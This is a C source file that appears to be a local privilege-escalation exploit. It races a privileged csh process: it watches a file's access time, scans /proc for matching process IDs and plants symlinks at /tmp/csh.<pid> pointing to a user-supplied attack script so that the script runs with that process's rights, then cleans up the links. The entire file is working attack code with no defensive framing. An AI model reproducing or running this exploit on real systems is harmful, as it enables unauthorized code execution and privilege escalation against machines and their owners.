#include "init_race.h"

int main(int argc, char *argv[]){
  extern char *optarg;
  char *attackFile=NULL;
  int c, ret, pid;
  struct stat watchFileStat, watchFileStat2;
  struct stat AttackScriptStat, AttackScriptStat2;
  DIR *dirHandle;
  struct dirent *dirStruct;
  struct list listStruct;
  FILE *fProcstat;
  char target[256], commandName[16], nameHolder[256];
  char procFile[256];

  while ((c = getopt(argc, argv, "f:")) != EOF){
    switch (c) {
      case 'f':
        attackFile = optarg;
        break;
      default:
        usage(argv[0]);
    }
  }

  if (!attackFile){
    printf("please specify file to have executed via -f flag\n");
    exit(1);
  }

  checkAttackScript(attackFile, &AttackScriptStat);

  ret = stat(WATCHFILE, &watchFileStat);
  if (ret != 0){
    printf("problem stating %s\nexiting...", WATCHFILE);
    perror("stat: ");
    exit(1);
  }
 
  dirHandle = opendir("/proc");
  if (!dirHandle) {
    printf("could not open /proc\nexiting...");
    perror("opendir: ");
    exit(1);
  }

  rewinddir(dirHandle);

  initList(&listStruct);

  while (1) {
    stat(WATCHFILE, &watchFileStat2);
    if (watchFileStat.st_atime < watchFileStat2.st_atime){

      while ( (dirStruct = readdir(dirHandle)) != NULL) {
        if (strIsNum(dirStruct->d_name, strlen(dirStruct->d_name)) ){
          snprintf(procFile, sizeof(target), "%s/%s/%s", 
                   PROCDIR, dirStruct->d_name, "stat");
          fProcstat = fopen(procFile, "r");
          if (fProcstat){
            fscanf(fProcstat, "%d%15s", &pid, commandName);

            if (strcmp(PROC_CMP, commandName) == 0){

              memset(nameHolder, '\0', sizeof(nameHolder));
              snprintf(nameHolder, sizeof(nameHolder), "/tmp/csh.%d", pid);
              symlink(attackFile, nameHolder);

              addToList(&listStruct, nameHolder);

            } /* end if strcmp(PROC_CMP */

          } /* end if (fProcstat){ */

        } /* end if(strIsNum... */

      } /* end while(dirent ... */
      /* 
         we've walked through the entire directory list now
         so we will spin on the attack script looking to see the
         access time change. Upon seeing this we will remove all of
         the links we have made. If we missed making the correct
         link we will sit here forever.
      */
      stat(attackFile, &AttackScriptStat2);
      while (1) {
        if (AttackScriptStat.st_atime < AttackScriptStat2.st_atime){

#ifdef DEBUG
          walkList(&listStruct);
#endif
          removeFromList(&listStruct);   
          printf("."); /* cheap-skate counter */
          fflush(NULL);
          sleep(3); /* let the rest of the stuff straighten out */
          stat(attackFile, &AttackScriptStat);
          stat(attackFile, &AttackScriptStat2);
          stat(WATCHFILE, &watchFileStat);
          stat(WATCHFILE, &watchFileStat2);
          rewinddir(dirHandle);
          initList(&listStruct);
        }
        break;
      }
    } /* end if (watchFileStat.st_atime ... */
    
  } /* end while (1) { */

} 

